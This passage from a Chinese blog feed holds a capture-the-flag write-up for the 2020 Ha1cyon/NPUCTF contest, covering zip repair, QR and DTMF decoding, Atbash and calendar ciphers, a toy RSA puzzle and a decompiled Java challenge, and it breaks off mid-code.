flag。</p><p><code>flag{6da01c0a419b0b56ca8307fc9ab623eb}</code></p><blockquote><p>导出这个压缩包可以先选中，再 <code>Ctrl + Shift + X</code>导出分组字节流。而后保存到文件打开就行。</p><p><img src="/2020/04/25/CTF_2020DASCTF_April/export.png" alt="导出分组字节流"></p></blockquote><blockquote><p>后面有空再了解一下内存取证什么的（这次好像有一题</p></blockquote><br><hr><p><strong>题目版权归官方所有。</strong></p><p><strong>以上内容仅供学习研究使用，请勿用于非法用途。</strong></p><p>好像这篇有点水唉（先不管了</p><p>周日还要补周一的课呢（</p><p><em>（溜了溜了</em></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | 2020 Ha1cyon_CTF公开赛 WriteUp</title>
      <link href="/2020/04/21/CTF_2020Ha1cyonCTF/"/>
      <url>/2020/04/21/CTF_2020Ha1cyonCTF/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>看 CTF 群里有大佬引流，说周末西北瓜大（NPU）有个 CTF 比赛，<strong>据说对萌新比较友好</strong>，于是就来看了看。</p><p><strong>官方平台地址：</strong><a href="http://ha1cyon-ctf.fun:666/" target="_blank" rel="noopener">http://ha1cyon-ctf.fun:666/</a></p><p>周六比赛刚开始，平台就被 DDoS 了，于是那时只下载了一道题目的附件就啥也没了……比赛过程中平台也屡受攻击，端口换了好几次，比如 666-&gt;777-&gt;778-&gt;777-&gt;98x，平台用动态端口还是第一次见呢 23333。</p><p>结果比赛时间一直拖到了周二晚上，题目还越来越多，噢，是<strong>不会的题目越来越多了</strong>！</p><p>随便写点 Writeup 好了，主要是会做的部分吧，顺便记录了一下做题的体会啦。</p><p><em>（后面再看心情会不会按照大佬们的 WP 复现一下</em></p><br><hr><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="HappyCheckInVerification"><a href="#HappyCheckInVerification" class="headerlink" title="HappyCheckInVerification"></a>HappyCheckInVerification</h3><p>压缩包中的 endLocator 被改到最前面了，挪回去。然后把伪加密去掉。修改如下面红色部分所示。</p><p><img src="/2020/04/21/CTF_2020Ha1cyonCTF/misc_zip.png" alt="misc_zip"></p><p>解压出来一个是黑人抬棺的视频（真的有啊。。），另一个是一个二维码。</p><p><img src="/2020/04/21/CTF_2020Ha1cyonCTF/wklv_lv_iodj.png" alt="wklv_lv_iodj"></p><p>拉到 PS 里补上三个角，得到下面这图。</p><p><img src="/2020/04/21/CTF_2020Ha1cyonCTF/wklv_lv_iodj_new.png" alt="wklv_lv_iodj_new"></p><p>扫码得到：</p><pre><code>?flag{this_is_not_flag}三曳所諳陀怯耶南夜缽得醯怯勝數不知喝盧瑟侄盡遠故隸怯薩不娑羯涅冥伊盧耶諳提度奢道盧冥以朋罰所即栗諳蒙集皤夷夜集諳利顛呐寫無怯依奢竟#￥#%E68BBFE4BD9BE68B89E6A0BCE79A84E5A7BFE58ABFE59CA8E69C80E5908E32333333||254333254242254338254342254231254338254345254432254238254643254236254145254239254441254437254234254232254131254236254245253244253244254343254438254330254341254336254435...sadwq#asdsadasf faf$use$dasdasdafafa_$ba##se64$</code></pre><p>第一部分</p><pre><code>三曳所諳陀怯耶南夜缽得醯怯勝數不知喝盧瑟侄盡遠故隸怯薩不娑羯涅冥伊盧耶諳提度奢道盧冥以朋罰所即栗諳蒙集皤夷夜集諳利顛呐寫無怯依奢竟</code></pre><p> 这一段扔去<a href="http://keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="noopener">佛曰</a>，得到：</p><blockquote><p>说了这不是佛拉格，你还来转？给爷爪巴</p></blockquote><p>佛拉格 flag 可还行…看来不是了。</p><p>中间一段 </p><pre><code>E68BBFE4BD9BE68B89E6A0BCE79A84E5A7BFE58ABFE59CA8E69C80E5908E32333333</code></pre><p>拿去 base16 一下得到：</p><blockquote><p>拿佛拉格的姿势在最后2333</p></blockquote><p>下一部分 </p><pre><code>254333254242254338254342254231254338254345254432254238254643254236254145254239254441254437254234254232254131254236254245253244253244254343254438254330254341254336254435</code></pre><p>base16 得到：</p><blockquote><p>%C3%BB%C8%CB%B1%C8%CE%D2%B8%FC<br>%B6%AE%B9%DA%D7%B4%B2%A1%B6%BE<br>%2D%2D%CC%D8%C0%CA%C6%D5</p></blockquote><p>看上去是 urlencode，解码得到：</p><p>（这里气死我了，居然用的 gb2312 编码而不是 UTF-8，我以为假的半天解不出来，虽然的确没啥用…</p><blockquote><p>没人比我更懂冠状病毒–特朗普</p></blockquote><p><img src="/2020/04/21/CTF_2020Ha1cyonCTF/image-20200421224413508.png" alt="urldecode"></p><p>后面这部分没看明白，但感觉是提示了 use base64.</p><p>另外，发现黑人抬棺视频里又出现了熟悉的拨号声，就是<a href="https://miaotony.xyz/2020/03/15/CTF_2020XCTF_gxzy/">之前在XCTF高校战“疫”里</a>碰到的 <strong>DTMF 信号</strong>。</p><p>于是把视频导出了音频，然后拖到 Audacity 里，查看<strong>频谱图</strong>，<strong>提取出带有拨号声的片段</strong>，并限制频率范围，得到下面的图。</p><p><img src="/2020/04/21/CTF_2020Ha1cyonCTF/dtmf.png" alt="dtmf"></p><table><thead><tr><th></th><th>1209 Hz</th><th>1336 Hz</th><th>1477 Hz</th><th>1633 Hz</th></tr></thead><tbody><tr><td>697 Hz</td><td>1</td><td>2</td><td>3</td><td>A</td></tr><tr><td>770 Hz</td><td>4</td><td>5</td><td>6</td><td>B</td></tr><tr><td>852 Hz</td><td>7</td><td>8</td><td>9</td><td>C</td></tr><tr><td>941 Hz</td><td>*</td><td>0</td><td>#</td><td>D</td></tr></tbody></table><p>对照表格得到 <code>418070885</code>。<em>（<del>可能有误，应该是个手机号码，可能漏了几位</del></em>  </p><p><strong>（是 <code>13418070885</code></strong></p><p>base64 -&gt; <del><code>NDE4MDcwODg1</code></del> <code>MTM0MTgwNzA4ODU=</code></p><p>套上flag，<del><code>flag{nde4mdcwodg1}</code></del></p><p>发现<strong>不对！！！！！</strong>  <em>（然后做不下去了嘤嘤嘤</em></p><blockquote><p>赛后找到了一个软件可以分析 DTMF 信号，就是 <strong><code>dtmf2num.exe</code></strong>，<a href="https://dl.pconline.com.cn/download/462419-1.html" target="_blank" rel="noopener">在这里</a>可以下载。这里是它 sourceforge 的<a href="http://freshmeat.sourceforge.net/projects/dtmf2num" target="_blank" rel="noopener">项目地址</a>。<em>（好古老一个软件了</em></p><p>不过这题要用软件的话需要截取对应的片段才行，毕竟 BGM 太杂了而且频率信号比较有规律……</p></blockquote><blockquote><p>By the way，抛开题目来说，这个 BGM 就属于电音嘛，就一堆有规律的频率信号的组合唉，还带有连续调频。。</p></blockquote><p>后面看了大佬的 WP，发现需要把 b64encode 后的结果发到西北瓜大信安协会的公众号<small style="color: white;"><em>（NWPUSEC）</em></small>（居然这样引流！），得到一个音频信号，是无线电传输的图像，解码得到的图片里就有 flag……</p><p>（真想不出来，啊是无线电大佬！Misc 真的杂。</p><p><img src="/2020/04/21/CTF_2020Ha1cyonCTF/gzh.png" alt="公众号回复"></p><br><h3 id="抽象带师"><a href="#抽象带师" class="headerlink" title="抽象带师"></a>抽象带师</h3><p><img src="/2020/04/21/CTF_2020Ha1cyonCTF/image-20200421135805788.png" alt="题目"></p><p><code>NPUCTF{欢迎来到西北工业大学CTF比赛世界上最简单的比赛}</code></p><p>您也是<strong>抽象带师</strong>？</p><p>再也不信什么 Easy/(Real) Ez/Baby/Basic/Not Hard/… 都是假的假的。</p><br><h3 id="parts"><a href="#parts" class="headerlink" title="parts"></a>parts</h3><p>好几个parts，zde0, zde1, zfr0, …</p><p>看文件头是一堆压缩包，解出来有个 hint</p><pre><code>Here's the hint:33 * 33 = 1089And everything is inside the image</code></pre><p>还有一张图，<code>BV1kx411F7Fn.png</code></p><p><img src="/2020/04/21/CTF_2020Ha1cyonCTF/BV1kx411F7Fn.png" alt="BV1kx411F7Fn"></p><p>看来 flag 在图片里，不过 33*33 没看明白。</p><p>foremost 提取不出来，看 Hex 文件是有点问题。</p><p>图片文件名看上去像是 B站的 BV 号，上去看了一下没找到什么线索……</p><br><h3 id="吃了它"><a href="#吃了它" class="headerlink" title="吃了它"></a>吃了它</h3><p><code>may be hint.txt</code>提示</p><pre><code>emmmmm...something important was hidden in secret, but I can't find it!</code></pre><p><code>lookatme.txt</code></p><p><img src="/2020/04/21/CTF_2020Ha1cyonCTF/lookatme.png" alt="lookatme"></p><p>下面有一段莫名奇妙的空白字符。不清楚啥玩意了。</p><p><img src="/2020/04/21/CTF_2020Ha1cyonCTF/lookatme_2.png" alt="空白字符"></p><p><code>secret</code>文件头是 <code>MPE1</code>（4D 50 45 31），搜了一下没找到相关的文件格式呢。</p><p>蹲 WP。</p><br><hr><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="查源码"><a href="#查源码" class="headerlink" title="查源码"></a>查源码</h3><p>终于看到有送分题了！</p><p>就是查源码完事。</p><p>F12 禁掉了，用 <code>Ctrl + Shift + C</code> 或者点浏览器的 Web 开发者 之类的就行。</p><br><hr><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Classical-Cipher"><a href="#Classical-Cipher" class="headerlink" title="Classical_Cipher"></a>Classical_Cipher</h3><p><code>key.txt</code> 中提示：</p><pre><code>解密后的flag请用flag{}包裹压缩包密码：gsv_pvb_rh_zgyzhs对应明文：   ***_key_**_******</code></pre><p>看了一下，不是凯撒。于是丢到 <a href="https://quipqiup.com/" target="_blank" rel="noopener"><em>quipqiup</em></a> 去解密，已知 pvb=key。</p><p>根据得到的答案，大概形式是 the_key_is_??????，后面这个不大对，于是改变 clues 为 <code>pvb=key rh=is gs=th</code>，得到合理的解为 <code>the_key_is_atbash</code>。</p><p><img src="/2020/04/21/CTF_2020Ha1cyonCTF/quipquip.png" alt="quipquip"></p><blockquote><p>噢，赛后发现这是 <code>atbash</code> 编码（埃特巴什码），一种古典的密码。</p><p>密文就是字母表反过来对应位置的字母，即密文和明文字母的对应位置之和为27.</p><p>常文：A B C D E F G H I J K L M N O P Q R S T U V W X Y Z</p><p>密文：Z Y X W V U T S R Q P O N M L K J I H G F E D C B A</p></blockquote><p>拿这个密码去解压 <code>flag.zip</code>，得到一张图片。</p><p><img src="/2020/04/21/CTF_2020Ha1cyonCTF/Classical_Cipher_flag.png" alt="flag"></p><p>又是抽象带师。有一部分是猪圈密码的变种，见下图。</p><p><img src="/2020/04/21/CTF_2020Ha1cyonCTF/zhuquan.jpg" alt="img"></p><p><code>C??SSIC??C??E</code></p><p>剩下的突然想到是字符形状的字体了，联想题目 Classical Cipher，应该是 classical。</p><p>找了个识别字体的网站，比如<a href="https://www.likefont.com/" target="_blank" rel="noopener">这个</a>，然后对应一波发现真的有！</p><p><img src="/2020/04/21/CTF_2020Ha1cyonCTF/image-20200418221049215.png" alt="识别字体"></p><p>在 <strong>Egypt0 Regular</strong> 里没找到，倒是在 <strong>ROSETTA STONE Regular</strong> 里找到了。</p><p><img src="/2020/04/21/CTF_2020Ha1cyonCTF/image-20200418221125237.png" alt=""></p><p>于是就是 <code>CLASSICALCODE</code>（其实对应上D就猜到是<code>code</code>了）。<code>flag{CLASSICALCODE}</code>交上去发现不对，要换成小写。</p><p><code>flag{classicalcode}</code></p><blockquote><p>原来这是古埃及象形文字…</p><p><img src="/2020/04/21/CTF_2020Ha1cyonCTF/JGO2y6.png" alt="古埃及象形文字"></p></blockquote><blockquote><p>更多密码可以看这篇文章：<a href="http://www.tuicool.com/articles/2E3INnm" target="_blank" rel="noopener">http://www.tuicool.com/articles/2E3INnm</a></p></blockquote><br><h3 id="这是什么觅🐎"><a href="#这是什么觅🐎" class="headerlink" title="这是什么觅🐎"></a>这是什么觅🐎</h3><p><img src="/2020/04/21/CTF_2020Ha1cyonCTF/flag.jpg" alt="flag"></p><blockquote><p>2020年4月</p><p>F1 W1 S22 S21 T12 S11 W1 S13</p></blockquote><p>是<strong>日历密码</strong>唉！（真会玩呢</p><p>3 1 12 5 14 4 1 18</p><pre class=" language-python"><code class="language-python">l<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">]</span>s<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> l<span class="token punctuation">:</span>    s<span class="token operator">+=</span>chr<span class="token punctuation">(</span>ord<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token punctuation">)</span><span class="token operator">+</span>i<span class="token number">-1</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span></code></pre><p>得到 <code>CALENDAR</code></p><p><code>flag{calendar}</code></p><blockquote><p><strong>日历密码原则：</strong>  </p><p>（1）1—26代表a—z26个英文字母；（2）M,T1,W,T2,F,S1,S2分别代表周一到周日七天（英文首字母代替，1，2为了有别，也人为增加密度）；（3）密钥即密码表  </p><p>以2007年11月份的日历为密码表，我们来加密这个单词：dictionary<br>第一步，用数字代替明文中的字母，即D I  C  T  I  O  N  A  R  Y;<br>                     4  9 3 20  9 15  14 1  18 25<br>第二步，写密文。<br>方法：例如单词首字母D用4代替，则在日历中找到4号，发现是本月第一个星期日，所以用S21表示；又如第七个字母N用数字14代表，找到14号，发现是本月第二个星期三，用W2代表。如此类推，得到密文如下：<br>S21 F2 S11 T13 F2 T23 W2 T21 S23 S24  </p><p><strong>此类密码的解法如下：</strong><br>（1）首先要知道密钥，即密码表；<br>（2）其次分解密码中的星期 i，即变成星期+数字的形式；<br>（3）去寻找对应的是第几个出现的星期 i，对应日期；<br>（4）对应字母，练成单词，短语或句子。  </p></blockquote><br><h3 id="认清形势，建立信心"><a href="#认清形势，建立信心" class="headerlink" title="认清形势，建立信心"></a>认清形势，建立信心</h3><p>题目如下，看上去就是 RSA 之类的吧。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> secret <span class="token keyword">import</span> flagp <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">)</span>e <span class="token operator">=</span> <span class="token comment" spellcheck="true"># Hidden</span>q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">)</span>n <span class="token operator">=</span> p <span class="token operator">*</span> qm <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">.</span>strip<span class="token punctuation">(</span>b<span class="token string">"npuctf{"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span>b<span class="token string">"}"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>c <span class="token operator">=</span> pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>pow<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>pow<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>pow<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''169169912654178  128509160179202  518818742414340  358553002064450  '''</span></code></pre><p>这次去看了一些 RSA 的知识，然而不大明白这些加密算法，更不了解相关的解密算法，还没有 OI 基础，于是题目看起来挺简单的然而还是不大会解 emmm（（</p><p>（<code>Crypto</code>模块都不大熟有哪些现成方法，<code>gmpy2</code> 模块装了半天还没装好。。</p><p>题目应该叫 <code>认清形势，放弃幻想</code> 才对吧。</p><br><hr><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="machine（不记得题目了"><a href="#machine（不记得题目了" class="headerlink" title="machine（不记得题目了"></a>machine（不记得题目了</h3><p><img src="/2020/04/21/CTF_2020Ha1cyonCTF/image-20200422011349867.png" alt="GUI 界面"></p><p>这题是个 Java 写的应用，拿去 Java Decompiler 反编译了一下，得到：</p><p><img src="/2020/04/21/CTF_2020Ha1cyonCTF/image-20200422011720335.png" alt="反编译结果"></p><p>虽然也没学过 Java，但大概意思还是能看个大概的。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Gui</span>  <span class="token keyword">extends</span> <span class="token class-name">Frame</span><span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">c</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    JFrame f <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JFrame</span><span class="token punctuation">(</span><span class="token string">"gkd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    f<span class="token punctuation">.</span><span class="token function">setBounds</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token number">250</span><span class="token punctuation">,</span> <span class="token number">600</span><span class="token punctuation">,</span> <span class="token number">450</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    f<span class="token punctuation">.</span><span class="token function">setLayout</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">final</span> Container j <span class="token operator">=</span> f<span class="token punctuation">.</span><span class="token function">getContentPane</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    JButton c <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JButton</span><span class="token punctuation">(</span><span class="token string">"奥里给"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">final</span> JTextField b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JTextField</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">final</span> JLabel l <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JLabel</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    JLabel saying <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JLabel</span><span class="token punctuation">(</span><span class="token string">"团长说:180298505946947064650759"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    b<span class="token punctuation">.</span><span class="token function">addKeyListener</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">KeyListener</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">keyTyped</span><span class="token punctuation">(</span>KeyEvent e<span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token keyword">int</span> c <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">getKeyChar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>c <span class="token operator">&lt;</span> <span class="token number">48</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>c <span class="token operator">></span> <span class="token number">57</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          e<span class="token punctuation">.</span><span class="token function">consume</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>      <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">keyReleased</span><span class="token punctuation">(</span>KeyEvent e<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>      <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">keyPressed</span><span class="token punctuation">(</span>KeyEvent e<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    c<span class="token punctuation">.</span><span class="token function">addActionListener</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ActionListener</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">actionPerformed</span><span class="token punctuation">(</span>ActionEvent e<span class="token punctuation">)</span>      <span class="token punctuation">{</span>        String s <span class="token operator">=</span> b<span class="token punctuation">.</span><span class="token function">getText</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">boolean</span> u <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> s<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token string">'0'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token string">'9'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            u <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BigInteger</span><span class="token punctuation">(</span><span class="token string">"100"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">compareTo</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BigInteger</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          u <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>u<span class="token punctuation">)</span>        <span class="token punctuation">{</span>          l<span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span><span class="token string">"逗爷玩呢,给爷爪巴,再玩下去团长就要唱希望之花了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        Lib f <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Lib</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        BigInteger b <span class="token operator">=</span> f<span class="token punctuation">.</span><span class="token function">e</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        l<span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span><span class="token string">"n="</span> <span class="token operator">+</span> b<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">",e=65537"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        j<span class="token punctuation">.</span><span class="token function">validate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    b<span class="token punctuation">.</span><span class="token function">setBounds</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    c<span class="token punctuation">.</span><span class="token function">setBounds</span><span class="token punctuation">(</span><span class="token number">250</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    l<span class="token punctuation">.</span><span class="token function">setBounds</span><span class="token punctuation">(</span><span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">260</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    saying<span class="token punctuation">.</span><span class="token function">setBounds</span><span class="token punctuation">(</span><span class="token number">190</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">220</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    j<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>    j<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>    j<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">;</span>    j<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>saying<span class="token punctuation">)</span><span class="token punctuation">;</span>    f<span class="token punctuation">.</span><span class="token function">setDefaultCloseOperation</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    f<span class="token punctuation">.</span><span class="token function">setVisible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span></code></pre><p>这上面的代码都是控制 GUI 的，给输入框绑定了函数，如果不是数字（’0’-‘9’）的话就销毁（输入不显示在框里）。</p><p>给 button 绑定了执行函数，首先判断输入字符是不是数字，再比较输入的数字是否 &gt;100，如果都不成立就输出 <code>逗爷玩呢,给爷爪巴,再玩下去团长就要唱希望之花了</code>。</p><pre class=" language-java"><code class="language-java">Lib f <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Lib</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>BigInteger b <span class="token operator">=</span> f<span class="token punctuation">.</span><span class="token function">e</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>l<span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span><span class="token string">"n="</span> <span class="token operator">+</span> b<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">",e=65537"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>都成立的话再用输入的数字去实例化 LIb，看上面这几行感觉就是算大整数n了，又是 RSA？</p><p>按照上面的规则输入几个数字试了试，发现程序卡死，疯狂占用 CPU 的一个核心（单线程呢）进行运算。</p><p>是在干嘛噢，下面看看 Lib 类吧。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> machine<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>math<span class="token punctuation">.</span>BigInteger<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>HashMap<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Map<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Random<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Set<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Stack<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Lib</span><span class="token punctuation">{</span>  <span class="token keyword">private</span> BigInteger b<span class="token punctuation">;</span>  <span class="token keyword">private</span> Map<span class="token operator">&lt;</span>BigInteger<span class="token punctuation">,</span> Integer<span class="token operator">></span> m<span class="token punctuation">;</span>  <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> B <span class="token operator">=</span> <span class="token 